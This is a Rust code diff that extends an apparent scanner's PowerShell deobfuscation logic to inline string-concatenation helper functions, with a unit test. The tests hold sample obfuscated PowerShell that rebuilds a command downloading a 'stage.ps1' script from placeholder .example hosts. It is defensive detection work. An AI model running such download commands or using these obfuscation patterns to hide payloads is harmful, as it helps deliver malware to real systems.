@@ -1071,6 +1071,14 @@ static PS_LITERAL_STRING_CASE_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
 });
 
 #[allow(clippy::expect_used)]
+static PS_LITERAL_CONCAT_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\+\s*(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?"#,
+    )
+    .expect("ps literal concat extractor body regex")
+});
+
+#[allow(clippy::expect_used)]
 static PS_LITERAL_INDEX_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\[\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\]"#,
@@ -3827,6 +3835,44 @@ fn expand_literal_string_case_extractor_calls(text: &str) -> String {
             param_index.len(),
             kind,
         );
+    }
+    out
+}
+
+fn expand_literal_concat_extractor_calls(text: &str) -> String {
+    let lower = text.to_ascii_lowercase();
+    if !has_literal_extractor_def_signal(&lower) || !text.contains('+') || !text.contains('\'') {
+        return text.to_string();
+    }
+
+    let mut out = text.to_string();
+    for (name, params, body) in literal_substring_extractor_defs(text).into_iter().take(32) {
+        let Some(caps) = PS_LITERAL_CONCAT_EXTRACTOR_BODY_RE.captures(&body) else {
+            continue;
+        };
+        let Some(left_var) = caps.get(1).map(|m| m.as_str()) else {
+            continue;
+        };
+        let Some(right_var) = caps.get(2).map(|m| m.as_str()) else {
+            continue;
+        };
+
+        let param_index = parse_ps_function_param_indices(&params);
+        let Some(left_idx) = param_index.get(&left_var.to_ascii_lowercase()).copied() else {
+            continue;
+        };
+        let Some(right_idx) = param_index.get(&right_var.to_ascii_lowercase()).copied() else {
+            continue;
+        };
+
+        let binding = PsConcatExtractorParamBinding {
+            left_idx,
+            left_name: left_var,
+            right_idx,
+            right_name: right_var,
+            arg_count: param_index.len(),
+        };
+        out = inline_ps_literal_concat_calls(&out, &name, binding);
     }
     out
 }
@@ -6668,6 +6714,146 @@ impl PsStringCaseKind {
     }
 }
 
+#[derive(Clone, Copy)]
+struct PsConcatExtractorParamBinding<'a> {
+    left_idx: usize,
+    left_name: &'a str,
+    right_idx: usize,
+    right_name: &'a str,
+    arg_count: usize,
+}
+
+fn inline_ps_literal_concat_calls(
+    text: &str,
+    name: &str,
+    binding: PsConcatExtractorParamBinding<'_>,
+) -> String {
+    let lower = text.to_ascii_lowercase();
+    let needles = ps_literal_extractor_call_needles(text, name);
+    let bytes = text.as_bytes();
+    let mut matches = Vec::new();
+    let mut match_count = 0;
+
+    for needle in needles {
+        let mut search_from = 0;
+        while match_count < 128 {
+            let Some(rel) = lower[search_from..].find(&needle) else {
+                break;
+            };
+            let call_start = search_from + rel;
+            let end_name = call_start + needle.len();
+            let Some((replace_start, mut pos)) =
+                ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
+            else {
+                search_from = end_name;
+                continue;
+            };
+            let parenthesized = bytes.get(pos) == Some(&b'(');
+            if parenthesized {
+                pos = skip_ascii_ws(bytes, pos + 1);
+            }
+            let parsed = if bytes.get(pos) == Some(&b'-') {
+                inline_ps_named_literal_concat_call(
+                    text,
+                    pos,
+                    parenthesized,
+                    binding.left_name,
+                    binding.right_name,
+                )
+            } else {
+                parse_ps_positional_literal_concat_args(text, pos, parenthesized, binding)
+                    .map(|(call_end, value)| (call_end, format!("'{}'", value.replace('\'', "''"))))
+            };
+            let Some((call_end, replacement)) = parsed else {
+                search_from = end_name;
+                continue;
+            };
+            matches.push((replace_start, call_end, replacement));
+            search_from = call_end;
+            match_count += 1;
+        }
+    }
+
+    let mut out = text.to_string();
+    for (start, end, replacement) in matches.into_iter().rev() {
+        out.replace_range(start..end, &replacement);
+    }
+    out
+}
+
+fn parse_ps_positional_literal_concat_args(
+    text: &str,
+    mut pos: usize,
+    parenthesized: bool,
+    binding: PsConcatExtractorParamBinding<'_>,
+) -> Option<(usize, String)> {
+    if binding.arg_count == 0
+        || binding.arg_count > 8
+        || binding.left_idx >= binding.arg_count
+        || binding.right_idx >= binding.arg_count
+    {
+        return None;
+    }
+
+    let bytes = text.as_bytes();
+    let mut left = None;
+    let mut right = None;
+    let mut arg_end = pos;
+    for idx in 0..binding.arg_count {
+        let (next_end, arg) = parse_ps_literal_or_usize_arg(text, pos)?;
+        if idx == binding.left_idx {
+            left = Some(arg.as_str()?.to_string());
+        }
+        if idx == binding.right_idx {
+            right = Some(arg.as_str()?.to_string());
+        }
+        arg_end = next_end;
+        pos = next_end;
+        if idx + 1 < binding.arg_count {
+            pos = skip_ps_arg_separator(bytes, pos, parenthesized);
+        }
+    }
+
+    if parenthesized {
+        let after = skip_ascii_ws(bytes, arg_end);
+        if bytes.get(after) != Some(&b')') {
+            return None;
+        }
+        arg_end = after + 1;
+    }
+
+    let mut value = left?;
+    value.push_str(&right?);
+    (value.len() <= 8192).then_some((arg_end, value))
+}
+
+fn inline_ps_named_literal_concat_call(
+    text: &str,
+    pos: usize,
+    parenthesized: bool,
+    left_name: &str,
+    right_name: &str,
+) -> Option<(usize, String)> {
+    let (call_end, args) =
+        parse_ps_named_static_literal_or_usize_args(text, pos, parenthesized, 4)?;
+    let left = args
+        .iter()
+        .find(|(name, _)| name.eq_ignore_ascii_case(left_name))?
+        .1
+        .as_literal()?;
+    let right = args
+        .iter()
+        .find(|(name, _)| name.eq_ignore_ascii_case(right_name))?
+        .1
+        .as_literal()?;
+    let mut value = left.to_string();
+    value.push_str(right);
+    if value.len() > 8192 {
+        return None;
+    }
+    Some((call_end, format!("'{}'", value.replace('\'', "''"))))
+}
+
 fn inline_ps_literal_split_index_calls(
     text: &str,
     name: &str,
@@ -7332,6 +7518,9 @@ fn expand_obfuscation(text: &str) -> String {
             if signals.string_case_extractor {
                 out = expand_literal_string_case_extractor_calls(&out);
             }
+            if signals.literal_concat_extractor {
+                out = expand_literal_concat_extractor_calls(&out);
+            }
             if signals.literal_index_extractor {
                 out = expand_literal_index_extractor_calls(&out);
             }
@@ -7455,6 +7644,9 @@ fn expand_obfuscation(text: &str) -> String {
             if signals.string_case_extractor {
                 out = expand_literal_string_case_extractor_calls(&out);
             }
+            if signals.literal_concat_extractor {
+                out = expand_literal_concat_extractor_calls(&out);
+            }
             if signals.literal_index_extractor {
                 out = expand_literal_index_extractor_calls(&out);
             }
@@ -7513,6 +7705,7 @@ struct PsObfuscationSignals {
     remove_extractor: bool,
     insert_extractor: bool,
     string_case_extractor: bool,
+    literal_concat_extractor: bool,
     literal_index_extractor: bool,
     split_index: bool,
     embedded_single_quote_assignment: bool,
@@ -7558,6 +7751,8 @@ impl PsObfuscationSignals {
         let insert_extractor = has_function_def && lower.contains(".insert");
         let string_case_extractor =
             has_function_def && (lower.contains(".tolower") || lower.contains(".toupper"));
+        let literal_concat_extractor =
+            has_function_def && text.contains('+') && text.contains('\'');
         let literal_index_extractor = has_function_def
             && (lower.contains('[')
                 || lower.contains(".chars")
@@ -7614,6 +7809,7 @@ impl PsObfuscationSignals {
             remove_extractor,
             insert_extractor,
             string_case_extractor,
+            literal_concat_extractor,
             literal_index_extractor,
             split_index,
             embedded_single_quote_assignment,
@@ -7650,6 +7846,7 @@ impl PsObfuscationSignals {
             || self.remove_extractor
             || self.insert_extractor
             || self.string_case_extractor
+            || self.literal_concat_extractor
             || self.literal_index_extractor
             || self.split_index
             || self.embedded_single_quote_assignment
@@ -9558,13 +9755,13 @@ fn line_has_powershell_payload_flag(line: &str) -> bool {
 #[cfg(test)]
 mod literal_substring_extractor_tests {
     use super::{
-        expand_doubled_quote_literals, expand_literal_index_extractor_calls,
-        expand_literal_insert_extractor_calls, expand_literal_remove_extractor_calls,
-        expand_literal_replace_extractor_calls, expand_literal_split_index_extractor_calls,
-        expand_literal_string_case_extractor_calls, expand_literal_substring_extractor_calls,
-        expand_literal_trim_extractor_calls, expand_parenthesized_string_concat,
-        literal_substring_extractor_defs, PS_LITERAL_INDEX_EXTRACTOR_BODY_RE,
-        PS_LITERAL_SUBSTRING_EXTRACTOR_BODY_RE,
+        expand_doubled_quote_literals, expand_literal_concat_extractor_calls,
+        expand_literal_index_extractor_calls, expand_literal_insert_extractor_calls,
+        expand_literal_remove_extractor_calls, expand_literal_replace_extractor_calls,
+        expand_literal_split_index_extractor_calls, expand_literal_string_case_extractor_calls,
+        expand_literal_substring_extractor_calls, expand_literal_trim_extractor_calls,
+        expand_parenthesized_string_concat, literal_substring_extractor_defs,
+        PS_LITERAL_INDEX_EXTRACTOR_BODY_RE, PS_LITERAL_SUBSTRING_EXTRACTOR_BODY_RE,
     };
 
     #[test]
@@ -9935,6 +10132,23 @@ Lower 0 'INVOKE-WEBREQUEST -URI HTTPS://PS-REORDERED-LOWER-EXTRACTOR.EXAMPLE/STA
                 "'invoke-webrequest -uri https://ps-reordered-lower-extractor.example/stage.ps1'"
             ),
             "reordered literal string-case extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_concat_extractor_named_args_call_is_rewritten() {
+        let text = r#"function Join-Text($left,$right) {
+  return $left + $right
+}
+Join-Text -right '.example/stage.ps1' -left 'Invoke-WebRequest -Uri https://ps-concat-named-extractor'"#;
+
+        let out = expand_literal_concat_extractor_calls(text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-concat-named-extractor.example/stage.ps1'"
+            ),
+            "named-argument concat extractor call was not rewritten:\n{out}"
         );
     }
 
